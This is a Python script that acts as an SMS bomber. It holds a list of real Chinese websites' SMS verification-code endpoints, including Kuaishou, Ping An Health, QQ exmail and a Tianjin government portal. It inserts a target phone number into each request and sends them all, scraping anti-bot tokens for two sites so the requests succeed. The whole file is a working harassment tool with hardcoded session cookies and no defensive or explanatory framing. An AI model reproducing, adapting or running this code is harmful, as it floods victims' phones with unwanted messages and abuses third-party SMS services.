# -*- coding: utf-8 -*-
import json
import re
import time

import requests

api_list = [
    {
        "url": "https://newapp.lgmi.com/login/getVerifyCode.asp",
        "type": "POST",
        "headers": {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Connection': 'keep-alive',
            'Accept': '*/*',
            'User-Agent': 'ironLGMI/3.7.4 (iPhone; iOS 15.4.1; Scale/3.00)',
            'Accept-Language': 'zh-Hans-CN;q=1',
            'Content-Length': '24',
            'Accept-Encoding': 'gzip, deflate'
        },
		"parm":{"phone":"target_Phone"}
    },
    {
        "url": "https://m.health.pingan.com/mapi/smsCode.json?deviceId=5a4c935cbb6ff6ca&deviceType=SM-G9300&timestamp=1545122608&app=0&platform=3&app_key=PAHealth&osversion=23&info=&version=1.0.1&resolution=1440x2560&screenSize=22&netType=1&channel=m_h5&phone=target_Phone",
        "type": "GET"
    },
    {
        "url": "https://www.smartstudy.com/api/user-service/captcha/phone",
        "parm": {
            "type": "authenticode",
            "phone": "target_Phone",
            "countryCode": "86",
        },
        "type": "POST"
    },
    {
        "url": "https://exmail.qq.com/cgi-bin/bizmail_portal?action=send_sms&type=11&t=biz_rf_portal_mgr&ef=jsnew&resp_charset=UTF8&area=86&mobile=target_Phone",
        "type": "GET",
    },
    {
        "url": "https://id.kuaishou.com/pass/kuaishou/sms/requestMobileCode",
        "type": "POST",
        "parm": {
            "sid": "kuaishou.live.web",
            "type": "53",
            "countryCode": "+86",
            "phone": "target_Phone"
        }
    },
    {
        "url": "http://jrh.financeun.com/Login/sendMessageCode3.html?mobile=target_Phone&mbid=197873&check=3",
        "type": "GET",
        "cookie": "PHPSESSID=q8h78o91qm30m5bl7lufkt3go3; jrh_visit_log=q8h78o91qm30m5bl7lufkt3go3; Hm_lvt_b627bb080fd97f01181b26820034cfcb=1580999339; UM_distinctid=1701ae772688ac-09ae1bde44e676-6701b35-144000-1701ae772699ca; CNZZDATA1276814029=219078261-1580999135-%7C1580999135; Hm_lpvt_b627bb080fd97f01181b26820034cfcb=1580999403"
    },
    {
        "url": "https://developer.i4.cn/put/getMsgCode.xhtml?_=1580912157461&phoneNumber=target_Phone&codeType=6",
        "type": "GET"
    },
    {
        "special": "xxsy",
        "first": {
            "url": "https://www.xxsy.net/Reg",
            "type": "GET"
        },
        "url": "https://www.xxsy.net/Reg/Actions",
        "type": "POST",
        "parm": {
            "method": "sms",
            "mobile": "target_Phone",
            "uname": "target_Phone",
            "token": "",
        },
        "headers": {
            "cookie": "ASP.NET_SessionId=1zpetajacprst1vvgvtqvt2u; pcstatpageusersign=1lzva83zoqa3qpid3ukvojnye9xgq0th; UM_distinctid=1701a43b89b44b-0e920e8853ac59-6701b35-144000-1701a43b89c9d1; CNZZDATA1275068799=1423156539-1580988611-https%253A%252F%252Fwww.hao123.com%252F%7C1580988611; CNZZDATA1275068004=1203802890-1580988611-https%253A%252F%252Fwww.hao123.com%252F%7C1580988611; __qc_wId=999; pgv_pvid=1596346520; xxcpoint=GU3TIZJYHE3DOZJTGAZTKOJUGJSGIOJWG5SWCMDDGA4DANJZGJRA",
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
            "X-Requested-With": "XMLHttpRequest"
        }
    },
    {
        "special": "ruanmei",
        "first": {
            "url": "https://my.ruanmei.com/?page=register",
            "type": "GET"
        },
        "headers": {
            "cookie": "ASP.NET_SessionId=wmw5kiwrmvxibb2zvk2qhxsh; CheckCode=MXPF; CheckCode_fp=GNGW; KLBRSID=b039105d4718660de1867d1c40076e29|1580992153|1580992141; sendsms=Thu%20Feb%2006%202020%2020%3A29%3A13%20GMT+0800%20%28%u4E2D%u56FD%u6807%u51C6%u65F6%u95F4%29",
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
            "Referer": "https://my.ruanmei.com/?page=register",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/json; charset=UTF-8"
        },
        "url": "https://my.ruanmei.com/Default.aspx/SendSmsReg20190319",
        "type": "POST",
        "parm": {
            "mobile": "target_Phone",
            "checkreg": "true",
            "validate": "",
            "data": ""
        }
    },
    {
        "url": "http://qydj.scjg.tj.gov.cn/reportOnlineService/login_login",
        "type": "POST",
        "parm": {
            "MOBILENO": "target_Phone",
            "TEMP": "1"
        },
        "cookie": "qcdzh-session-id=fe77ec80-efb8-4238-844e-c0e136b349de; UM_distinctid=1701adce0071-069b6727280a07-6701b35-144000-1701adce00891c; CNZZDATA1274944014=862482110-1580998603-http%253A%252F%252Fqydj.scjg.tj.gov.cn%252F%7C1580998603"
    },
]


def replacePhone(phone):
    target_list = []
    for api in api_list:
        api_str = json.dumps(api)
        api_str = api_str.replace("target_Phone", phone)
        target_list.append(json.loads(api_str))
    return target_list


def default(jiekou, headers):
    resp = requests.request(
        url=jiekou["url"],
        method=jiekou["type"],
        headers=headers,
        data=jiekou.get("parm", "")
    )
    print(resp.status_code)
    print(resp.text)
    print(resp.url)
    print()


def caseSpecial(jiekou, special):
    if special == 'xxsy':
        xxsy(jiekou)
    elif special == 'ruanmei':
        ruanmei(jiekou)


def xxsy(jiekou):
    # 获取token
    resp = requests.request(url=jiekou["first"]["url"], method=jiekou["first"]["type"], headers=jiekou["headers"])
    jiekou["parm"]["token"] = re.findall(", checkCode, '(.*?)',", resp.text)[0]

    resp = requests.request(
        url=jiekou["url"],
        method=jiekou["type"],
        headers=jiekou["headers"],
        data=jiekou.get("parm")
    )
    print("潇湘书院")
    print(resp.status_code)
    print(resp.content.decode())
    print(resp.url)
    print()


def ruanmei(jiekou):
    # 获取token
    resp = requests.request(url=jiekou["first"]["url"], method=jiekou["first"]["type"], headers=jiekou["headers"])
    jiekou["parm"]["data"] = re.findall("id=\"data20190202\" value='(.*?)'", resp.text)[0]
    print(jiekou["parm"]["data"])

    # 发送短信
    resp = requests.request(
        url=jiekou["url"],
        method=jiekou["type"],
        headers=jiekou["headers"],
        data=json.dumps(jiekou.get("parm"))
    )
    print("软媒")
    print(resp.status_code)
    print(resp.content.decode())
    print(resp.url)
    print()


def run(jiekou_list):
    for jiekou in jiekou_list:
        special = jiekou.get("special")
        if special:
            caseSpecial(jiekou, special)
        else:
            headers = {
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 Html5Plus/1.0',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'zh-CN,zh-TW;q=0.8,zh;q=0.6,en;q=0.4,ja;q=0.2',
                'cache-control': 'max-age=0',
                "X-Requested-With": "XMLHttpRequest",
                'cookie': jiekou.get("cookie", ""),
                "referer": jiekou.get("referer", ""),
            }
            if jiekou.get("headers"):
                headers = jiekou.get("headers")
            default(jiekou, headers)



if __name__ == '__main__':
    phone = ""
    target_list = replacePhone(phone)
    run(target_list)
